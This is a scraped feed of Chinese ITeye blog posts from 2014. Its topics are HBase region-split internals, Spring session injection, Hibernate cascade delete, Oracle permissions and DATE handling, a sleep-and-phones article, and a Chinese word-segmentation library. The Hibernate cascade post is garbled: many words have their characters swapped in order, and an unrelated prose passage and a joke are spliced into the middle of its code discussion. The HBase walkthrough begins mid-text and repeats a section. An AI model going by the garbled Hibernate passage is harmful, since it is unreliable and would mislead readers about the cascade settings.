d.如果c方法调用返回的结果是false,返回null
f.调用RegionSplitPolicy.getSplitPoint()方法返回进行split的切分rowkey
  f.1如果region.explicitSplitPoint的值不为空，返回此值
  f.2迭代region中所有的store,调用HStore.getSplitPoint()方法得到此store的split rowkey
    HStore.getSplitPoint()方法流程：
  调用this.storeEngine.getStoreFileManager().getSplitPoint();得到一个splitpoint
  通过hbase.hstore.engine.class配置storeEngine的实现类，默认为DefaultStoreEngine
  默认的storeFileManager为DefaultStoreFileManager，如果store中没有storefile，返回null
  否则得到size最大的storefile,并得到此storefile的中间rowkey，并返回此值
g.检查f中得到的rowkey是否在region中，如果不在返回null,否则返回此rowkey,到此checkSplit流程完成
 
requestSplit见下面的compactSplitThread.requestSplit(region,rowkey)流程分析
      compactSplitThread.requestSplit(region, region.checkSplit());
      return SplitRegionResponse.newBuilder().build();
    } catch (IOException ie) {
      throw new ServiceException(ie);
    }
  }
 
compactSplitThread.requestSplit(region,rowkey)流程
此方法是所有的split请求的最终执行处理程序
 
  public synchronized void requestSplit(final HRegion r, byte[] midKey) {
如果进行split操作的传入进行切分region的rowkey为null,不做split操作
    if (midKey == null) {
      LOG.debug("Region " + r.getRegionNameAsString() +
        " not splittable because midkey=null");
      return;
    }
    try {
生成一个SplitRequest执行线程，通过splits线程池执行此线程，
  线程池大小通过hbase.regionserver.thread.split配置，默认为1
      this.splits.execute(new SplitRequest(r, midKey, this.server));
      if (LOG.isDebugEnabled()) {
        LOG.debug("Split requested for " + r + ".  " + this);
      }
    } catch (RejectedExecutionException ree) {
      LOG.info("Could not execute split for " + r, ree);
    }
  }
 
SplitRequest.run方法处理流程：
  public void run() {
    if (this.server.isStopping() || this.server.isStopped()) {
      LOG.debug("Skipping split because server is stopping=" +
        this.server.isStopping() + " or stopped=" + this.server.isStopped());
      return;
    }
    try {
      final long startTime = System.currentTimeMillis();
生成一个split执行程序
      SplitTransaction st = new SplitTransaction(parent, midKey);
 
      //acquire a shared read lock on the table, so that table schema modifications
      //do not happen concurrently
      tableLock = server.getTableLockManager().readLock(parent.getTableDesc().getTableName()
          , "SPLIT_REGION:" + parent.getRegionNameAsString());
      try {
        tableLock.acquire();
      } catch (IOException ex) {
        tableLock = null;
        throw ex;
      }
 
      // If prepare does not return true, for some reason -- logged inside in
      // the prepare call -- we are not ready to split just now. Just return.
 
根据splitkey把原来的region的startkey到splitkey与current time生成一个regioninfo
根据splitkey把原来的region的splitkey到endkey与current time生成一个regioninfo
      if (!st.prepare()) return;
      try {
执行split操作，通过hbase.regionserver.fileSplitTimeout配置split file的timeout时间，默认为30000ms
在zk中的region-in-transition路径下生成一个根据此region的子路径的RegionTransition实例，
  此实例在zk上存储的值为新生成的两个hregioninfo信息，
  并设置zk中此节点的EventType为RS_ZK_REQUEST_REGION_SPLIT
  在hdfs中的此region目录下生成一个.splits目录,
  关闭当前的region,并得到当前region中所有的store与store下的storefile列表。
  从rs中的onlineRegions列表中移出此region
  迭代每一个store中的所有storefile，生成一个SplitTransaction.StoreFileSplitter实例
  通过HRegionFileSystem.splitStoreFile生成一个以splitrow结束的与一个以splitrow开头的Reference的hfile
  并存储在切分后的两个新的region的.splits/cfname/storefilename.oldregionname文件
  通过调用HRegion(oldregion).createDaughterRegionFromSplits(newregionInfo)生成两个新的HRegion实例
  并把.splits目录下的hfile文件move到newregion的目录下
  更新meta表中的信息
  生成SplitTransaction.DaughterOpener线程实例，在当前rs中直接通过openregion打开两个新的hregion实例。
  把zk中节点的transition的zk EventType从RS_ZK_REGION_SPLITTING更新到RS_ZK_REGION_SPLIT，
  通知master在regionserver中的split完成，等待master对这个消息进行处理。直到master处理完成。
        st.execute(this.server, this.server);
      } catch (Exception e) {
        if (this.server.isStopping() || this.server.isStopped()) {
          LOG.info(
              "Skip rollback/cleanup of failed split of "
                  + parent.getRegionNameAsString() + " because server is"
                  + (this.server.isStopping() ? " stopping" : " stopped"), e);
          return;
        }
        try {
          LOG.info("Running rollback/cleanup of failed split of " +
            parent.getRegionNameAsString() + "; " + e.getMessage(), e);
          if (st.rollback(this.server, this.server)) {
            LOG.info("Successful rollback of failed split of " +
              parent.getRegionNameAsString());
          } else {
            this.server.abort("Abort; we got an error after point-of-no-return");
          }
        } catch (RuntimeException ee) {
          String msg = "Failed rollback of failed split of " +
            parent.getRegionNameAsString() + " -- aborting server";
          // If failed rollback, kill this server to avoid having a hole in table.
          LOG.info(msg, ee);
          this.server.abort(msg);
        }
        return;
      }
      LOG.info("Region split, hbase:meta updated, and report to master. Parent="
          + parent.getRegionNameAsString() + ", new regions: "
          + st.getFirstDaughter().getRegionNameAsString() + ", "
          + st.getSecondDaughter().getRegionNameAsString() + ". Split took "
          + StringUtils.formatTimeDiff(System.currentTimeMillis(), startTime));
    } catch (IOException ex) {
      LOG.error("Split failed " + this, RemoteExceptionHandler.checkIOException(ex));
      server.checkFileSystem();
    } finally {
      if (this.parent.getCoprocessorHost() != null) {
        try {
          this.parent.getCoprocessorHost().postCompleteSplit();
        } catch (IOException io) {
          LOG.error("Split failed " + this,
              RemoteExceptionHandler.checkIOException(io));
        }
      }
      releaseTableLock();
    }
  }
 
master中处理region split的监听流程
通过AssignmentManager.nodeDataChange事件监听rs中对split region的值修改。
nodeDataChanged-->handleAssignmentEvent-->handleRegion
      switch (rt.getEventType()) {
      case RS_ZK_REQUEST_REGION_SPLIT:
      case RS_ZK_REGION_SPLITTING:
      case RS_ZK_REGION_SPLIT:
设置两个新的region的状态为online状态。并删除zk上的路径
        if (!handleRegionSplitting(
            rt, encodedName, prettyPrintedRegionName, sn)) {
          deleteSplittingNode(encodedName, sn);
        }
        break;
 
执行memstore的flush后的split流程分析
在每次执行完成memstore时，会进行是否需要split的检查，如果需要进行split，会发起split request操作。
 private boolean flushRegion(final HRegion region, final boolean emergencyFlush) {
 
...............................................此处省去一些代码
 
Region.checkSplit流程：
a.检查region是否是meta/namespace的region,如果是返回null
b.如果hbase.master.distributed.log.replay配置为true时，同时openRegion后此region还没有被replay
  region.isRecovering==true,如果是返回null
c.通过hbase.regionserver.region.split.policy配置的RegionSplitPolicy,
  默认为IncreasingToUpperBoundRegionSplitPolicy,
  也可以直接在table create时配置SPLIT_POLICY的值为class
  调用splitPolicy.shouldSplit(),此方法做如下检查流程，并返回true与false
  c.1检查region.splitRequest的值是否为true,如果是，返回true,
  c.2得到当前regionserver中此region对应的table的所有region个数，
    得到region的存储最大size,
  c.2.1取出通过table create时的属性MAX_FILESIZE来设置的region最大存储大小，
如果没有取hbase.hregion.max.filesize配置的的值，默认为10 * 1024 * 1024 * 1024L(10g)
  c.2.2取出通过table create时的MEMSTORE_FLUSHSIZE属性来设置的region memstore的大小，
如果没有取hbase.hregion.memstore.flush.size配置的值，默认为1024*1024*128L(128M)
  c.2.3通过c.2.2的值*(当前rs中此table的region个数 * 当前rs中此table的region个数)
  c.2.4取出c.2.1中得到的值与c.2.3计算出的值最小的一个，得到region最大可存储的size值
  c.3检查region中所有store中是否有reference的storefile，如果有返回false
  c.4检查region中所有store中所有的storefile的大小是否超过了c.2中得到的size大小，如果是返回true
d.如果c方法调用返回的结果是false,返回null
f.调用RegionSplitPolicy.getSplitPoint()方法返回进行split的切分rowkey
  f.1如果region.explicitSplitPoint的值不为空，返回此值
  f.2迭代region中所有的store,调用HStore.getSplitPoint()方法得到此store的split rowkey
    HStore.getSplitPoint()方法流程：
  调用this.storeEngine.getStoreFileManager().getSplitPoint();得到一个splitpoint
  通过hbase.hstore.engine.class配置storeEngine的实现类，默认为DefaultStoreEngine
  默认的storeFileManager为DefaultStoreFileManager，如果store中没有storefile，返回null
  否则得到size最大的storefile,并得到此storefile的中间rowkey，并返回此值
g.检查f中得到的rowkey是否在region中，如果不在返回null,否则返回此rowkey,到此checkSplit流程完成
此处主要是检查region中是否有store的大小超过了配置的指定大小，也就是对c的检查
 
      boolean shouldSplit = region.checkSplit() != null;
      if (shouldSplit) {
如果需要做split操作，发起split request
        this.server.compactSplitThread.requestSplit(region);
      } else if (shouldCompact) {
        server.compactSplitThread.requestSystemCompaction(
            region, Thread.currentThread().getName());
      }
 
...............................................此处省去一些代码
 
    return true;
  }
 
 
  public synchronized boolean requestSplit(final HRegion r) {
    // don't split regions that are blocking
a.检查hbase.regionserver.regionSplitLimit配置的split limit是否大于rs中的onlineRegions的个数
  如果不想做split操作，可以把此值设置为一个较小的值，比如1
b.迭代region下的所有store,检查hbase.hstore.blockingStoreFiles配置的store的文件个数,默认为7
  减去store中所有的storefile的个是是否大于或等于Store.PRIORITY_USER(1)
    if (shouldSplitRegion() && r.getCompactPriority() >= Store.PRIORITY_USER) {
如果需要做split操作，得到split的key,此时默认从最大的storefile的中间key开始split
      byte[] midKey = r.checkSplit();
      if (midKey != null) {
发起split request,见compactSplitThread.requestSplit(region,rowkey)流程
        requestSplit(r, midKey);
        return true;
      }
    }
    return false;
  }
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
spring的普通类中如何取session和request对像, 1185734295.iteye.com.blog.2064161, Fri, 09 May 2014 09:19:50 +0800
在使用spring时,经常需要在普通类中获取session,request等对像.比如一些AOP拦截器类,在有使用struts2时,因为struts2有一个接口使用org.apache.struts2.ServletActionContext即可很方便的取到session对像.用法:ServletActionContext.getRequest().getSession();但在单独使用spring时如何在普通类中获取session,reuqest呢?其实也是有办法的.首先要在web.xml增加如下代码:  <listener>         <listener-class>org.springframework.web.context.request.RequestContextListener</listener-class>  </listener> 接着在普通bean类中:    [html] view plaincopy01.@Autowired  02.private HttpSession session;  03.  04.@Autowired  05.private HttpServletRequest request;      即可,在类中使用session对像了,是不是很方便呢..之所以要写出来是因为目前网上关于这个的用法,都是用什么写个lister再把session保存起来,太麻烦了.spring这么强大的框架,当然他们早也想到了.所以才有了我们这么方便的使用方法.       当前加了上面的listener后也可以使用代码的方式获取reuqest对像 HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest(); 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
删除级联hibernate级联删除, 1185734295.iteye.com.blog.2064013, Thu, 08 May 2014 17:17:56 +0800
最近研究删除级联，稍微总结一下，前当继续补充：     oad前当如果子象对生发了更新,也会级联更新). 但它不会级联删除     delete: 级联删除, 但不备具级联存保和更新     all-delete-orphan: 在除解父子系关时,主动删除不属于父象对的子象对, 也支撑级联删除和级联存保更新.     all: 级联删除, 级联更新,但除解父子系关时不会主动删除子象对.           delete-orphan:删除全部和前当象对除解联关系关的象对        意注：以上设在哪一段就是指对哪一端的操纵而言，比如delete，如果设在one的一端的<set>属性里，就是当one被删除的时候，主动删除全部的子录记；     如果设在many一端的<many-to-one>标签里，就是在删除many一端的数据时，会试图删除one一端的数据，如果仍然有many外键引用one，就会报“存在子录记”的错误；如果在one的一端同时也设置了cascade＝“delete”属性，就会生发很危险的况情：删除many一端的一条录记，会试图级联删除对应的one端录记，因为one也设置了级联删除many，所以其他全部与one联关的many都市被删掉。     所以，千万谨严在many一端设置cascade＝“delete”属性。     故此cascade一般用在<one-to-one>和<one-to-many>中         one-to-many中设置级联删除,比如:        [xhtml]  view plain copy<set          name="entryvalues"          lazy="false"          inverse="true"          order-by="VALUEID"          cascade="all-delete-orphan"      >          <key>              <column name="CONTEXTENTRYID" />          </key>          <one-to-many               class="Entryvalue"          />      </set>       如果用Hiberante的SchemaExport导出表到数据库,是不会在数据库中设置外键的cascade属性的,查看ENTRYVALUE表,其中的外键CONTEXTENTRYID的on delete属性是no action     但是应用Hiberante理管事务,它是会维护这类级联系关的,比如这样操纵:        [java]  view plain copypublic void testCascadeDelete() {          Session s = HibernateUtil.getSession();          Transaction tx;          try {              tx = s.beginTransaction();              Contextentry ce = (Contextentry)s.load(Contextentry.class, new Long(1));                            s.delete(ce);              tx.commit();                        } catch (HibernateException e) {              // TODO Auto-generated catch block              e.printStackTrace();          }      }       则引用此Contextentry的Entryvalue是会被确正级联删除的.       如果应用通普JDBC操纵,比如:     每日一道理  风，渐渐吹起，吹乱了我的发丝，也让我的长裙有些飘动。绿叶仿佛在风中起舞，离开了树，投向了大地，却不知这样会枯萎，我弯下腰，轻轻拾起一片树叶，那非常有序的茎脉，是一种美的点缀。我有些哀叹：绿叶啊，绿叶，你这般美丽地从树上轻轻飘下，随风起舞，却不知已被人称之为落叶！         [java]  view plain copy public void testCascadeDeleteSQL() {          Session s = HibernateUtil.getSession();          Transaction tx;          String sql = "delete contextentry where id=4";          try {              tx = s.beginTransaction();              Connection con = s.connection();              Statement st = con.createStatement();              st.execute(sql);              tx.commit();          } catch (HibernateException e) {              // TODO Auto-generated catch block              e.printStackTrace();          } catch (SQLException e) {              // TODO Auto-generated catch block              e.printStackTrace();          }      }       则会报"存在子录记"的错误,这里的Transaction实际上是无效的,因为用的是JDBC的Connection和Statement,已脱离了Hibernate的理管.如果手动将ENTRYVALUE表的关相外键ON DELETE属性设为CASCADE,则面上的操纵当然确正执行——级联删除子录记         all-delete－orphan 的力能：1. 当存保或更新父方象对时，级联存保或更新全部联关的子方象对，相当于 cascade 为 save-update 2. 当删除父方象对时，级联删除全部联关的子方象对，相当于 cascade 为 delete 3. 删除不再和父方象对联关的全部子方象对,当然，“不再和父方象对联关的全部子方象对”必须是在本次事务中生发的。  除解父子系关的 java  语句例如：         [java]  view plain copy public void testCascadeDelete() {          Session s = HibernateUtil.getSession();          Transaction tx;          try {              tx = s.beginTransaction();              Contextentry ce = (Contextentry)s.load(Contextentry.class, new Long(5));                            Entryvalue ev = (Entryvalue)s.load(Entryvalue.class, new Long(10));              ev.setContextentry(null);                            s.delete(ce);              tx.commit();                        } catch (HibernateException e) {              // TODO Auto-generated catch block              e.printStackTrace();          }      }       如果 cascade 属性取默认值 null，当除解父子系关时，会执行如下 sql：     update ENTRYVALUE set CONTEXTENTRYID=null where ID=10     即将对应外键置为null，而应用all-delete-orphan，则会在关相事务执行的时候，将孤儿子录记删除 文章结束给大家分享下程序员的一些笑话语录： 一个合格的程序员是不会写出 诸如 “摧毁地球” 这样的程序的，他们会写一个函数叫 “摧毁行星”而把地球当一个参数传进去。 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
在 Web 项目中应用 Apache Shiro, 1185734295.iteye.com.blog.2046719, Tue, 15 Apr 2014 17:01:43 +0800
http://blog.csdn.net/peterwanghao/article/category/1101326 http://www.ibm.com/developerworks/cn/java/j-lo-shiro/
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
手机为什么不该放卧室？, 1185734295.iteye.com.blog.2045891, Mon, 14 Apr 2014 17:49:39 +0800
下次你睡不着头脑风暴想着各种事，如你的购物清单，明天的会议，自己有没有锁门时，解决方法很简单，不要把你的手机放床边柜头，移出自己卧室。英国管理通信局一个调查发现，十人中有八人在睡觉时是把手机放在自己身边的，大概一半的人会把手机用作闹钟。专家担心过度的使用手机会影响我们的睡眠，没有足够的睡眠让我们恢复体力与精神，而且也可能因此引发失眠问题。睡眠专家梅多博士表示，人们如果把手机和其他电子产品移出卧室，睡得更好，他睡觉时，就是把手机放在厨房的。   更让人争议的是，睡觉把手机放床头可能会引起头晕和头痛。手机放在卧室会引发这么问题主要是由于它的光，特别现在现代高质量手机的屏幕反射的太亮的光。哈佛大学的睡眠医学教授查尔斯.切斯勒博士认为这种光会干扰我们身体的自然节奏，让我们身体机制误以为是白天.而梅多博士解释道手机的光刺激视网膜上的细胞,视网膜把这信息传递到大脑,所以这细胞会告诉我们的身体是什么时候.这控制着让你想睡觉得的荷尔蒙褪黑激素的释放还有让你苏醒的皮质醇激素。其实所有的人造灯光，一般的灯泡还是荧光屏，都会抑制褪黑激素的释放从而让我们身体机制往清醒状态靠拢，但手机屏蔽的光会有更大的影响。为什么光对我们有这么大的影响呢，萨里大学的黛布拉斯教授，神经内分沁专家解释是我们大多数人认为光线就是白色的，但它其实是由不同颜色不同波长的光线组合而成的。   平时的手机，平板电脑和电子阅读器发射出大量蓝色的光，一种更刺激的光。弧拱教授说：“这是因为我们视网膜上的黑视素色素对蓝光最敏感。光的类型，光的亮度，每天多常面对这光以及光离我们的距离和持续时间都会对我们身体生物钟有影响，如果你在凌晨玩手机，会越玩越清醒。所以为什么睡前用电子产品阅书会越看越精神，而看书本会更容易眼困，所以专家建议在睡觉前两三个小时不要接触电子产品。电视屏幕也会发出蓝色的光，但手机更接近我们的眼睛。即使很短时间的光，就是一个消息提示或就看看你手机都会有影响。2011年，美国斯坦福大学做了一项研究测试，让测试者只接触0.12秒的光,然后发现测试者的生物种推迟了2毫秒,他们变得更清醒.斯教授表示间断接触光和连续接触光的研究表明,前者对身体的影响更大。   梅多斯博士说我们的睡眠大概1.5-2个小时就会有短暂清醒的时刻,但通常会被忽略。所以我们睡觉时把手机放在床边，如果夜里醒来，我们会比较容易真正醒来。大脑会时尔醒过来这源于人类的进化，如果睡得很沉，会随时被攻击，所以大脑要保持一定警惕。所以在这些很短的清醒时刻里，外界的一点动静如闪光或手机一条短信的振动都让你完全醒过来。如果你这时候你又去检查手机，这样刺激到大脑的认知部分，那样你就会真正醒过来了。谢菲尔德大学的心理学和认知科学的讲师汤姆.斯塔福德郡表示十分之四的智能手机使用者都会有没有看一下手机，尽管不是每次都有特别的事，但他们总认为可能有。哈佛大学神经学家巴克博士称之为“警惕威胁”，这有很大影响，因为时常检查手机比奖励对我们的诱惑更大，虽然我们知道我们不应该这样，所以我们很难真正入睡当手机放在我们床头，即使我们很努力地睡觉。而睡眠专家尼尔.斯坦利博士补充说：为了睡一个好觉好，你不要担心任何事，有一种安全感，其实晚上你关机，潜意识里是说明你还想着电话。这样大脑会把这种潜意识灌输在你的大脑，你的睡眠会更浅，更容易被打扰。   手机的工作原理是各基站间传播无线电波-----一种电磁辐射。这种辐射与治疗症的X射线不同，它们不能改变我们原子结构，但是，研究表明这种电磁辐射可能会影响我们在睡觉的脑电波。噢大利亚伍伦贡电磁辐射生物效应的莎拉博士说：我们手机放在床头睡觉相当于讲电话半小时给我们脑电波带来的影响。这些影响主要发生在我们深睡眠的时候，但我们还不知道这些影响真正的后果。2008年有一项研究，测试者平均要花6分钟的时间达到深度睡眠，暴露手机辐射后，他们深睡眠时间平均少了8分钟，这8分钟是他们睡眠周期里最清醒的时候。   但科学家们说他们需用更多的证据来证明人们是否受手机辐射的影响，因为现在对手机或是无线网络是否会引起头痛，恶心，头晕，耳鸣和睡眠障碍等问题还是很有争议的。萨默塞特医生安德鲁博士发现一些抱怨失眠和头痛的患者一但在卧室关掉手机就会改善情况。安德鲁博士现在是英国一家电敏感组织的受托人，他说，我们不知道这里的机器是如何的，但鉴于我们身体细胞对能量波声音或光线的敏感度的比较 ，我们发现细胞对无线电波这些类型的频率不敏感。但许多研究人同怀疑说我们不能就说这些症状就是由所谓的电磁辐射引起的，伦敦的皇家学院精神病研究所的鲁宾博士詹姆斯说他们做了11项手机影响人们睡觉的研究，发现测试都有睡着以至第二天早上才能问他们感觉如何。所以好消息我们看不到电磁辐射对睡眠的影响，但不代表它们没有影响，也可能有毁灭性的影响皇家伯克郡医院的医学物理学和临床工程授斯佩林也说：“没有证据说手机可以以电磁辐射来影响你的健康。但实际上，在电磁领域里，拿着手机会带来一些不好的影响，因为变压器插入电源会无形中让人感觉压抑。   所以专家们还是一致建议在睡觉时最好把手机关掉，因为它对睡觉是虽没有证明有坏处，但也绝对没有好处。 
已有 3 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
oracle表空间权限问题, 1185734295.iteye.com.blog.2045888, Mon, 14 Apr 2014 17:46:25 +0800
你需要理解一个模式的概念。。。新建用户A 无论他是管理员还是只用CONNECT 权限的用户，新建的时候都会产生一个和用户绑定的模式。SYSTEM的用户也是有模式的，名字PUBLIC.例如。新建个用户A ， 就有了模式A ，用用户新建了个表空间ATS，这个ATS就是属于模式A 的。ATS里所有的对象，表啊 视图啊 索引啊。。别的用户，无论是什么系统权限的，包括SYS也是不能访问的。如果B 需要访问ATS里面的东西的话，必须要用户A赋予B  SELECT 的对象权限，注意 ，是对象权限，就是说是针对ATS里某个对象的，可以使表，也可以是表空间。赋予的方法就是 登录A 使用 GRANT语句 赋予B 。赋予之后 B 要访问 ATS里的表A 的时候，，就SELECT * FROM ATS.A 记得要带上模式名字。
已有 2 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
关于Oracle10g驱动date类型没有时分秒问题, 1185734295.iteye.com.blog.2043050, Thu, 10 Apr 2014 15:41:52 +0800
 一般的数据库中，DATE字段仅仅表示日期，不包括日期信息，而Oracle数据库中的DATE数据类型是包括日期、时间的，对于不同的Oracle jdbc驱动版本，对于该问题的处理都有些区别。 最近使用 ORACLE 10G，时间字段因需求，设为了DATE类型，发现hibernate用native SQL 查询，显示不了时分秒，原来是JDBC驱动自动把date映射为 java.sql.date，故截断了时分秒信息，如果你使用9i或者11g 的驱动程序，就没有该问题，但是Oracle10g的JDBC驱动，你会发现没有时分秒 ，在Oracle9.2之后，引入了内置数据类型TIMESTAMP。之所以引入它，是因为内置数据类型DATE的最小单位为秒；DATE的主要问题是它粒度不能足够区别出两个事件哪个先发生。9.2版本后ORACLE在DATE数据类型上扩展出来了TIMESTAMP数据类型，它包括了所有DATE数据类型的年月日时分秒的信息，而且包括了小数秒(纳秒Nanoseconds级的)的信息。如果你想把DATE类型转换成TIMESTAMP类型，就使用CAST函数。 也正是从oracle 9.2开始，内置数据类型DATE和TIMESTAMP在使用9i的JDBC驱动做查询时，DATE被映射为java.sql.Date,TIMESTAMP被映射为java.sql.Timestamp。 从Oracle11开始，其JDBC驱动程序又重新开始回归为将内置类型DATE映射为java.sql.Timestamp(正如9.2之前的那样)。 所以，时分秒精度的丢失与hibernate无关，是oracle jdbc驱动的问题。最好的解决办法就是：换驱动。经测试，将最开始使用的10g的驱动ojdbc14.jar换为11g的驱动ojdbc5.jar后； 配置：      [html] view plaincopy01.<property name="hibernate.connection.oracle.jdbc.V8Compatible">true</property>    或者在 数据库中把 date 设为 timestamp 类型。 各个驱动包存在的BUG：
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
java.lang.IllegalArgumentException, 1185734295.iteye.com.blog.2042826, Thu, 10 Apr 2014 09:21:14 +0800
严重: Error starting static Resources java.lang.IllegalArgumentException: Document base D:\workspace12\.metadata\.plugins\org.eclipse.wst.server.core\tmp0\wtpwebapps\qizheng-manager-web does not exist or is not a readable directory  问题解决：没有找到为什么错了，只是按照 http://blog.csdn.net/sweblish/article/details/6686046 又配置了一下，就行了。没有找到原因，也就没有爽的感觉。 还有一种错误可能是：server的server.xml文件中，没有删除原来处理程序的地址。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
.classpath文件作用, 1185734295.iteye.com.blog.2042001, Tue, 08 Apr 2014 11:59:34 +0800
classpath就是指定一个路径，这个路径就是你运行程序所需要的class文件 因为java的类库和其他的东西都是需要类库支持的 我们就是运行一个简单的hello word程序，也需要继承Object类，这个类是java.lang包下面 我们的classpath就是指定了一个这样的包所在的位置~~~
已有 4 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
数据挖掘 IBM SPSS Modeler 新手使用入门, 1185734295.iteye.com.blog.2040742, Thu, 03 Apr 2014 16:46:10 +0800

http://www.360doc.com/content/11/0602/10/63626_121118701.shtml#
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
软件项目管理ppt, 1185734295.iteye.com.blog.2037603, Thu, 27 Mar 2014 16:56:50 +0800

软件项目管理-软件工程概论.ppt
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
企业信息管理系统基础框架jeesite, zhaoshijie.iteye.com.blog.2062349, Tue, 06 May 2014 22:21:22 +0800
jeesite项目地址（使用说明，）：http://jeesite.com/ jeesite在线演示：http://www.99sijia.com:8080/a
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
java中文分词组件-word分词, zhaoshijie.iteye.com.blog.2062328, Tue, 06 May 2014 21:33:14 +0800
 关键字：java中文分词组件-word分词  word分词器主页 ：https://github.com/ysc/word   word分词是一个Java实现的中文分词组件，提供了多种基于词典的分词算法，并利用ngram模型来消除歧义。 能准确识别英文、数字，以及日期、时间等数量词，能识别人名、地名、组织机构名等未登录词。 同时提供了Lucene、Solr、ElasticSearch插件。 分词使用方法：  　　1、快速体验　　运行项目根目录下的脚本demo-word.bat可以快速体验分词效果　　用法: command [text] [input] [output]　　命令command的可选值为：demo、text、file　　demo　　text 杨尚川是APDPlat应用级产品开发平台的作者　　file d:/text.txt d:/word.txt　　exit 　　2、对文本进行分词　　移除停用词：List<Word> words = WordSegmenter.seg("杨尚川是APDPlat应用级产品开发平台的作者");　　保留停用词：List<Word> words = WordSegmenter.segWithStopWords("杨尚川是APDPlat应用级产品开发平台的作者");　　System.out.println(words);  　　输出：　　移除停用词：[杨尚川, apdplat, 应用级, 产品, 开发平台, 作者]　　保留停用词：[杨尚川, 是, apdplat, 应用级, 产品, 开发平台, 的, 作者] 　　3、对文件进行分词　　String input = "d:/text.txt";　　String output = "d:/word.txt";　　移除停用词：WordSegmenter.seg(new File(input), new File(output));　　保留停用词：WordSegmenter.segWithStopWords(new File(input), new File(output)); 　　4、自定义配置文件　　默认配置文件为类路径下的word.conf，打包在word-x.x.jar中　　自定义配置文件为类路径下的word.local.conf，需要用户自己提供　　如果自定义配置和默认配置相同，自定义配置会覆盖默认配置　　配置文件编码为UTF-8  　　5、自定义用户词库　　自定义用户词库为一个或多个文件夹或文件，可以使用绝对路径或相对路径　　用户词库由多个词典文件组成，文件编码为UTF-8　　词典文件的格式为文本文件，一行代表一个词　　可以通过系统属性或配置文件的方式来指定路径，多个路径之间用逗号分隔开　　类路径下的词典文件，需要在相对路径前加入前缀classpath:  　　指定方式有三种：　　指定方式一，编程指定（高优先级）：　　WordConfTools.set("dic.path", "classpath:dic.txt，d:/custom_dic");　　DictionaryFactory.reload();//更改词典路径之后，重新加载词典　　指定方式二，Java虚拟机启动参数（中优先级）：　　java -Ddic.path=classpath:dic.txt，d:/custom_dic　　指定方式三，配置文件指定（低优先级）：　　使用类路径下的文件word.local.conf来指定配置信息　　dic.path=classpath:dic.txt，d:/custom_dic 　　如未指定，则默认使用类路径下的dic.txt词典文件 　　6、自定义停用词词库　　使用方式和自定义用户词库类似，配置项为：　　stopwords.path=classpath:stopwords.txt，d:/custom_stopwords_dic 　　7、自动检测词库变化　　可以自动检测自定义用户词库和自定义停用词词库的变化　　包含类路径下的文件和文件夹、非类路径下的绝对路径和相对路径　　如：　　classpath:dic.txt，classpath:custom_dic_dir,　　d:/dic_more.txt，d:/DIC_DIR，D:/DIC2_DIR，my_dic_dir，my_dic_file.txt  　　classpath:stopwords.txt，classpath:custom_stopwords_dic_dir，　　d:/stopwords_more.txt，d:/STOPWORDS_DIR，d:/STOPWORDS2_DIR，stopwords_dir，remove.txt  　　8、显式指定分词算法　　对文本进行分词时，可显式指定特定的分词算法，如：　　WordSegmenter.seg("APDPlat应用级产品开发平台", SegmentationAlgorithm.BidirectionalMaximumMatching);  　　SegmentationAlgorithm的可选类型为：　　正向最大匹配算法：MaximumMatching　　逆向最大匹配算法：ReverseMaximumMatching　　正向最小匹配算法：MinimumMatching　　逆向最小匹配算法：ReverseMinimumMatching　　双向最大匹配算法：BidirectionalMaximumMatching　　双向最小匹配算法：BidirectionalMinimumMatching　　双向最大最小匹配算法：BidirectionalMaximumMinimumMatching  　　9、分词效果评估 　　运行项目根目录下的脚本evaluation.bat可以对分词效果进行评估 　　评估采用的测试文本有253 3709行，共2837 4490个字符 　　评估结果位于target/evaluation目录下： 　　corpus-text.txt为分好词的人工标注文本，词之间以空格分隔 　　test-text.txt为测试文本，是把corpus-text.txt以标点符号分隔为多行的结果 　　standard-text.txt为测试文本对应的人工标注文本，作为分词是否正确的标准 　　result-text-***.txt，***为各种分词算法名称，这是word分词结果　　 perfect-result-***.txt，***为各种分词算法名称，这是分词结果和人工标注标准完全一致的文本　　 wrong-result-***.txt，***为各种分词算法名称，这是分词结果  Lucene插件： 　　1、构造一个word分析器ChineseWordAnalyzer　　Analyzer analyzer = new ChineseWordAnalyzer(); 　　2、利用word分析器切分文本　　TokenStream tokenStream = analyzer.tokenStream("text", "杨尚川是APDPlat应用级产品开发平台的作者");　　while(tokenStream.incrementToken()){　　CharTermAttribute charTermAttribute = tokenStream.getAttribute(CharTermAttribute.class);　　OffsetAttribute offsetAttribute = tokenStream.getAttribute(OffsetAttribute.class);　　System.out.println(charTermAttribute.toString()+" "+offsetAttribute.startOffset());　　}   　　3、利用word分析器建立Lucene索引　　Directory directory = new RAMDirectory();　　IndexWriterConfig config = new IndexWriterConfig(Version.LUCENE_47, analyzer);　　IndexWriter indexWriter = new IndexWriter(directory, config);     　　4、利用word分析器查询Lucene索引　　QueryParser queryParser = new QueryParser(Version.LUCENE_47, "text", analyzer);　　Query query = queryParser.parse("text:杨尚川");　　TopDocs docs = indexSearcher.search(query, Integer.MAX_VALUE);    Solr插件：  　　1、生成分词组件二进制jar　　执行 mvn clean install 生成word中文分词组件target/word-1.0.jar